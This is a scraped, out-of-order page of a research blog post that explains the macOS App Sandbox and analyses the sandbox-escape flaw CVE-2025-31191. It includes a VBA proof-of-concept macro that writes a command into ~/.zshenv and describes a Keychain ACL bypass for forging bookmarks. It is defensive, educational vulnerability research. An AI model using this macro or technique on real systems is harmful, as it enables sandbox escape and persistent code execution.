+&lt;li&gt;&lt;p&gt;&lt;strong&gt;AppleScriptTask&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;  This API allows macros to execute predefined AppleScripts. However, these scripts must be located in the &lt;code&gt;~/Library/Application Scripts/[bundle ID]/&lt;/code&gt; path, and since Office apps cannot access this path to create files, it was difficult to use macros for sandbox escape.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;GrantAccessToMultipleFiles&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;  This API prompts the user to select multiple files within the macro and grants access to those files outside the sandbox. It is particularly useful for large-scale tasks.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Among these, &lt;code&gt;AppleScriptTask&lt;/code&gt; appeared to have no significant security issues, so we conducted a thorough analysis centered on the &lt;code&gt;GrantAccessToMultipleFiles&lt;/code&gt; API.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SSB Abuse&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Using the &lt;code&gt;GrantAccessToMultipleFiles&lt;/code&gt; API, users can access files outside the sandbox by manually selecting and approving files. However, we discovered that &lt;strong&gt;the user&amp;#x2019;s file access approval is retained even after rebooting&lt;/strong&gt;. In other words, this approval information is &lt;strong&gt;permanently stored&lt;/strong&gt; somewhere, and if exploited, it allows access to files outside the sandbox without additional user approval. !!&lt;/p&gt;
+&lt;p&gt;Based on this, we were able to come up with the following scenario.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The user selects a file normally and grants access permissions.&lt;/li&gt;
+&lt;li&gt;These permissions are stored in the form of a Security-Scoped Bookmark.&lt;/li&gt;
+&lt;li&gt;A malicious macro exploits this bookmark to access specific files without any additional approval.&lt;/li&gt;
+&lt;li&gt;For example, manipulating an initial execution file such as &lt;code&gt;~/.zshenv&lt;/code&gt; &amp;#x2192; enables command execution outside the sandbox.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SSB exploitation through macros&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Based on the above scenario, we conducted the following tests.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Open Excel or Word and open a new document.&lt;/li&gt;
+&lt;li&gt;Press the shortcut key &lt;code&gt;Alt + F11&lt;/code&gt; &amp;#x2192; Open the VBA editor.&lt;/li&gt;
+&lt;li&gt;Select &lt;code&gt;Insert &amp;gt; Module&lt;/code&gt; from the top menu.&lt;/li&gt;
+&lt;li&gt;Paste the code and execute it.&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;        Sub Poc_GrantAccess()
+            Dim scptPath As String
+            Dim fileAccessGranted As Boolean
+            Dim filePermissionCandidates
+            Dim payload As String
+        
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; Set the payload&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            payload = &amp;quot;echo pwn&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            &amp;apos;&lt;/span&gt; Grant file permissions
+            scptPath = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/Users/&amp;quot;&lt;/span&gt; &amp;amp; Environ(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/.zshenv&amp;quot;&lt;/span&gt;
+            filePermissionCandidates = Array(scptPath)
+            fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)
+        
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; Create an Application Script&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Open scptPath For Output As #1&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Print #1, payload&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Close #1&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        End Sub&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;```    &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image10.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image11.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;If an SSB created based on user approval information is exploited, subsequent accesses may bypass the protection of the sandbox policy.&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image12.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;echo pwn executed successfully.&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;gt; **SSB Storage Location and Structure Analysis**&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;After checking where this bookmark is stored, we found that the data storing the user&amp;apos;&lt;/span&gt;s choice (file access approval) was stored &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; a PLIST file inside the Containers directory.
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image13.png)
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image14.png)
+
+The `Containers` directory is a special location that is not subject to App Sandbox restrictions, so even sandboxed apps can **freely access** files &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; this directory. This means that &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a malicious app can manipulate this PLIST file to artificially insert SSB, it can steal arbitrary file access permissions without separate user approval!
+
+However... this PLIST file is not a simple text file but is structured as a **signed binary format**. Therefore, simply overwriting values or adding entries is not easy... 
+
+&amp;gt; **ScopedBookmarkAgent Analysis**
+
+To gain a deeper understanding of how this works, we reverse engineered the relevant macOS modules and analyzed their structure.
+
+By default, sandboxed apps must obtain file access permission from the user via an Open dialog to access external files. This Open dialog is handled by a sandbox-external service named `com.apple.appkit.xpc.openAndSavePanelService.xpc`.
+
+When the user selects a file, this service transmits the access permissions &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; the selected file to the app &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; the form of a sandbox extension. This extension is created by the kernel and is a token signed with `HMAC-SHA256`, containing the actual file path, permission information (such as `com.apple.app-sandbox.read-write`), file metadata, and more. Apps that receive this extension can access the file through the `libsystem_sandbox.dylib` sub-API.
+
+However, there was a limitation that this extension token was **invalidated upon each reboot**.
+
+To solve this, Apple introduced a new non-sandbox process called **ScopedBookmarkAgent**. This agent performs the following two roles.
+
+1. Verify the received sandbox extension and convert it into a Bookmark object that can be stored long-term.
+2. Generate and deliver a new sandbox extension token based on the stored Bookmark data.
+
+For example, apps like Microsoft Office can use SSB &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; the following way!
+
+- User approves file access &amp;#x2192; bookmark stored &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; `securebookmarks.plist`
+- Subsequent access to the same file &amp;#x2192; bookmark via ScopedBookmarkAgent &amp;#x2192; new extension token generated
+
+This bookmark object is also signed with HMAC-SHA256, and the key used is calculated as follows.
+&lt;/code&gt;&lt;/pre&gt;
+cryptoKey = HMAC-SHA256(secret, &amp;#x201C;[bundle-id]&amp;#x201D;)&lt;br&gt;```&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The &lt;code&gt;secret&lt;/code&gt; used here is stored in the &lt;code&gt;com.apple.scopedbookmarksagent.xpc&lt;/code&gt; item in &lt;strong&gt;macOS Keychain&lt;/strong&gt;, making it very difficult for attackers to arbitrarily sign or manipulate bookmarks. Ultimately, in order to forge bookmarks for sandbox escape, attackers must steal the &lt;strong&gt;ScopedBookmarkAgent&amp;#x2019;s&lt;/strong&gt; signing key or be able to insert valid bookmarks indirectly. It&amp;#x2019;s a bit complicated, isn&amp;#x2019;t it?&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Keychain ACL bypass&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image15.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On macOS, &lt;strong&gt;Keychain&lt;/strong&gt; is a space for securely storing passwords and certificates. It can be considered similar to Windows Credential Manager.&lt;br&gt;An important feature of Keychain is that it has an &lt;strong&gt;Access Control List (ACL) that specifies which processes can access each item&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The Keychain item that caught my attention was &lt;code&gt;com.apple.scopedbookmarksagent.xpc&lt;/code&gt;, and its ACL was set to allow access only to &lt;strong&gt;ScopedBookmarkAgent&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;However&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;I discovered that this ACL only controls &lt;strong&gt;&amp;#x2018;read&amp;#x2019; permissions&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image16.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In other words, it was possible to delete existing items and register &lt;strong&gt;new items created&lt;/strong&gt; by attackers with the same names!&lt;/p&gt;
+&lt;p&gt;Attackers could even set &lt;strong&gt;ACL&lt;/strong&gt;s for new items themselves and configure them so that ScopedBookmarkAgent could access them freely.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image17.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This could be verified using the command.&lt;/p&gt;
+&lt;p&gt;As a result, if an attacker creates a new entry with a fixed secret value, ScopedBookmarkAgent will accept the key without suspicion and use it for signature verification.&lt;/p&gt;
+&lt;p&gt;Based on the above, an attacker could exploit the ACL structure of the keychain and the signature key derivation structure to &lt;strong&gt;manipulate and sign arbitrary SSBs&lt;/strong&gt;, thereby &lt;strong&gt;gaining a sandbox escape path&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This vulnerability could affect all macOS sandboxed apps that use SSBs and was particularly dangerous because it could be exploited as a generic macOS Sandbox Escape technique not limited to a single app. &lt;/p&gt;
+&lt;p&gt;In this article, I studied Sandbox Escape! It was fun&amp;#x2026;!!!&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll study something interesting again next time~ &amp;gt;_o&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://support.apple.com/en-us/122375&#34;&gt;https://support.apple.com/en-us/122375&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/&#34;&gt;https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/&#34;&gt;https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf&#34;&gt;https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/yo-yo-yo-jbo/macos_app_structure&#34;&gt;https://github.com/yo-yo-yo-jbo/macos_app_structure&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/&#34;&gt;https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/08/07/clalxk/macos_sandbox_escape_en/">
+
+  <title>[Research] macOS: Part2 - Sandbox Escape (en) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-08-07 17:00" pubdate>
+      2025년 8월 7일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.6k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      72
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Research] macOS: Part2 - Sandbox Escape (en)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/">macOS: Part0 - TCC Bypass</a></p>
+<p><a href="https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/">macOS: Part1 - SIP Bypass</a> </p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>macOS: Part2 - Sandbox Escape &#x2190; Now!</p>
+<p>Hello~ I&#x2019;m clalxk!</p>
+<p>Today, following Part1, I studied Sandbox Escape.</p>
+<p>From the concept of the macOS Sandbox to the analysis of a 1-day vulnerability (CVE-2025-31191), it&#x2019;s all here&#x2014;let&#x2019;s learn together.. (&gt;&lt;)</p>
+<h2 id="0-App"><a href="#0-App" class="headerlink" title="0. App"></a>0. App</h2><p>If you&#x2019;ve used Windows or Linux, the concept of an <code>App</code> on macOS might feel unfamiliar. It&#x2019;s unfamiliar, but not difficult b^_^b. Generally, when you run a single executable file (<code>.exe</code>, <code>a.out</code>), you think of the program starting immediately, loading libraries or config files from somewhere in the system as needed.</p>
+<p>For example, on Windows, if you run <code>notepad++.exe</code>, that one file launches the process.</p>
+<p>During that process, required <code>.dll</code> libraries are dynamically loaded from system folders or the installation path, and settings are stored externally in <code>.ini</code> files or the registry.</p>
+<p>However! On macOS, this structure is slightly different.</p>
+<p>On macOS, an <code>App</code> isn&#x2019;t just a simple executable file but a <strong>bundle</strong> with a <strong>directory structure</strong> (<strong>Bundle</strong>)</p>
+<p>Although it looks like a single app in Finder, in Terminal you&#x2019;ll see that <code>.app</code> is a directory containing not only the executable but also all necessary <strong>resources, config files, plugins, code signature data, etc.</strong></p>
+<p>Think of macOS treating an app as a package that bundles <strong>everything needed to run the app</strong> rather than a single program file.</p>
+<p>Let&#x2019;s look at the built-in Calculator app as an example!</p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image1.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Inside the <code>Contents</code> folder, you&#x2019;ll find.</p>
+<ul>
+<li><code>MacOS/</code>: Folder containing the executable</li>
+<li><code>Info.plist</code>: XML config file holding the app&#x2019;s metadata</li>
+<li><code>Resources/</code>: Icons, images, language packs, other resources</li>
+<li><code>PlugIns/</code>: (Optional) Plugins</li>
+<li><code>_CodeSignature/</code>: (Optional) Code signature info</li>
+<li><code>version.plist</code>, <code>PkgInfo</code>: (Optional) Other details</li>
+</ul>
+<p><code>Info.plist</code> is an XML-format file that holds important metadata about the app.</p>
+<p>It includes the path to the executable, the app name, the bundle ID, version, and more.</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleExecutable<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleIdentifier<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.apple.calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></code></pre>
+<p>Let&#x2019;s try running the app!</p>
+<h3 id="0-1-Launching-an-App"><a href="#0-1-Launching-an-App" class="headerlink" title="0.1 Launching an App"></a><strong>0.1 Launching an App</strong></h3><p>Launching an app essentially means <strong>creating a process</strong> that runs the binary specified by the <code>CFBundleExecutable</code> key. But which parent process launches it?</p>
+<p><em>* <code>CFBundleExecutable</code>: A key in the <code>Info.plist</code> of a macOS app bundle specifying the name of the binary to execute.</em></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image2.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>The command <code>open -a Calculator</code> is the same as double-clicking the Calculator app.</p>
+<p>I ran <code>ps</code> while Calculator was open:</p>
+<p><code>/System/Applications/Calculator.app/Contents/MacOS/Calculator</code> is running, PID 5012. Its parent process (PPID) is <code>1</code>!</p>
+<p>On macOS, PID 1 is <code>/sbin/launchd</code>. This daemon manages all system and user agents on macOS&#x2014;think of it like Windows&#x2019; <code>services.exe</code> or Linux&#x2019;s <code>systemd</code>. It not only manages background services but also acts as the <strong>parent for every GUI-launched app</strong>.</p>
+<p>When users double-click or use <code>open -a</code>, the app runs as a child of <code>launchd</code> (PID 1), making the process tree flat. On other OSes, you can trace which shell or terminal launched a program by following the PPID, but on macOS GUI launches, all apps appear as children of <code>launchd</code>.</p>
+<p>Before macOS Ventura, you could run the executable directly without <code>open</code>. But if not launched within a proper <code>launchd</code> environment, macOS would SIGKILL the app to protect the App Sandbox and TCC.</p>
+<pre><code class="hljs bash">$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp; 
+$ ps -A -j | grep Calculator | grep -v grep</code></pre>
+<p>When run directly, the parent was the shell, not <code>launchd</code>.</p>
+<p>For testing, I created a dummy <code>.app</code>:</p>
+<pre><code class="hljs bash">mkdir -p ~/MyApp.app/Contents/MacOS
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&apos;#!/bin/bash\nsleep 10&apos;</span> &gt; ~/MyApp.app/Contents/MacOS/MyApp
+chmod +x ~/MyApp.app/Contents/MacOS/MyApp
+
+~/MyApp.app/Contents/MacOS/MyApp &amp;
+ps -A -j | grep MyApp
+
+open -a MyApp
+ps -A -j | grep MyApp</code></pre>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image3.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image4.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>As expected, direct invocation makes it a terminal child while <code>open -a</code> makes it a <code>launchd</code> child.</p>
+<p><code>launchd</code> also handles <code>LaunchAgents</code> and <code>LaunchDaemons</code> for background services, but we won&#x2019;t cover that today. To be continued&#x2026;</p>
+<p>The <code>.app</code> described so far is just one of many types of bundles.</p>
+<p>macOS has various bundle types, as shown below. (This is not a complete list.)</p>
+<ul>
+<li><code>.app</code> &#x2013; An application bundle that contains all the elements that make up an app.</li>
+<li><code>.framework</code> &#x2013; A framework bundle that includes not only loadable code like <code>.dylib</code> but also resources, version information, etc. (The entire framework bundle can be loaded using <code>dlopen()</code>.)</li>
+<li><code>.kext</code> &#x2013; A kernel extension bundle that acts as an extension module loaded directly into the macOS kernel. For security reasons, Apple is gradually restricting their use in the latest versions of macOS.</li>
+<li><code>.plugin</code> &#x2013; Plugin bundles, which include extension modules loaded by the main application</li>
+</ul>
+<p>As such, bundles are not only used to run apps, but also serve as core components that support functional expansion and modularized structures across macOS. </p>
+<p>If so, let&#x2019;s move on~</p>
+<h2 id="1-App-Sandbox"><a href="#1-App-Sandbox" class="headerlink" title="1. App Sandbox"></a>1. App Sandbox</h2><p>We&#x2019;ve seen that macOS apps are bundles. Now let&#x2019;s see how apps are executed and restricted by the system.</p>
+<p>The key concept today is the <strong>App Sandbox</strong>!</p>
+<p>Ideally, from a security standpoint, you&#x2019;d never run untrusted code. But we install and run many apps, so macOS encloses each app in a <strong>sandbox</strong>, restricting it within a &#x201C;box&#x201D; it can&#x2019;t escape.</p>
+<p>Sandboxed apps are denied by default.</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Restriction</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>File system</td>
+<td>No access to all files, including home directory</td>
+</tr>
+<tr>
+<td>Network</td>
+<td>No internet or socket access</td>
+</tr>
+<tr>
+<td>Microphone/Camera</td>
+<td>No direct access (requires TCC approval)</td>
+</tr>
+<tr>
+<td>Photo library</td>
+<td>No access (requires separate permission)</td>
+</tr>
+<tr>
+<td>System APIs</td>
+<td>Blocked system calls, process control, etc.</td>
+</tr>
+<tr>
+<td>Child processes</td>
+<td>Can spawn, but children inherit the same sandbox limits</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>To avoid breaking essential features, some entitlements can be granted.</p>
+<p>For example, an image editor needs to open/save files chosen by the user. A sandboxed app needs explicit exceptions for this, defined in its <code>Entitlements</code>.</p>
+<p><em>* <code>Entitlements</code>: Permissions declared at code signing time, listing allowed capabilities.</em></p>
+<h3 id="1-1-What-are-Entitlements"><a href="#1-1-What-are-Entitlements" class="headerlink" title="1.1 What are Entitlements?"></a>1.1 What are Entitlements?</h3><p>Entitlements are declared in an XML-format <code>.entitlements</code> file or set in Xcode under Signing &amp; Capabilities.</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Entitlement Key</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>com.apple.security.network.client</code></td>
+<td>Allow network client access</td>
+</tr>
+<tr>
+<td><code>com.apple.security.files.user-selected.read-write</code></td>
+<td>Allow read/write to user-selected files</td>
+</tr>
+<tr>
+<td><code>com.apple.security.assets.pictures.read-write</code></td>
+<td>Allow photo library read/write</td>
+</tr>
+<tr>
+<td><code>com.apple.security.device.camera</code></td>
+<td>Allow camera access</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>In other words, the app cannot do anything by default, but can only operate within the permissions granted by the user.</p>
+<p><code>Entitlements</code> are typically written in XML format as <code>.entitlements</code> files, and can be added visually in Xcode under the Target &gt; Signing &amp; Capabilities tab.</p>
+<p>++  When using Sandbox, you must declare it as follows.</p>
+<pre><code class="hljs xml">
+<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.app-sandbox<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span></code></pre>
+<p>This key must be declared for macOS to run the app in sandbox mode.</p>
+<h3 id="1-2-TCC"><a href="#1-2-TCC" class="headerlink" title="1.2 TCC"></a>1.2 TCC</h3><p>You&#x2019;ve seen messages like:</p>
+<blockquote>
+<p>&#x201C;@@@&#x201D; Would Like to Modify Apps on your Mac.</p>
+</blockquote>
+<p>This prompt comes from macOS&#x2019;s <strong>TCC</strong> (Transparency, Consent, and Control). When an app attempts to access sensitive data, TCC forces an explicit user consent step, preventing unauthorized access.</p>
+<h2 id="2-Sandbox-Escape"><a href="#2-Sandbox-Escape" class="headerlink" title="2. Sandbox Escape"></a>2. Sandbox Escape</h2><p>We&#x2019;ve explored how strict the App Sandbox is. Can we bypass it to escape the sandbox?</p>
+<p>Of course it&#x2019;s not easy&#x2014;macOS enforces strict access controls. But vulnerabilities have existed. Let&#x2019;s analyze known macOS sandbox escape cases.</p>
